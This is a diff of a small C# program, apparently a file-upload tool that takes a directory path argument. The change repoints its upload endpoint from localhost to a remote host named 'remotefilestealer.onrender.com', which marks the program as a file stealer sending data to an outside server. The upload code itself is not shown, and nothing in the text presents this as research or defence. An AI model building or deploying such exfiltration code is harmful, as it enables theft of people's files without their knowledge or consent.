@@ -3,7 +3,7 @@ using System.IO;
 
 public class MainClass {
     public static string path = "practice/";
-    public static string serverUrl = "http://127.0.0.1:8080/upload";
+    public static string serverUrl = "https://remotefilestealer.onrender.com/upload";//"http://127.0.0.1:8080/upload";
     public static void Main(String[] args) {
         if (args.Length == 1) {
             path = args[0];
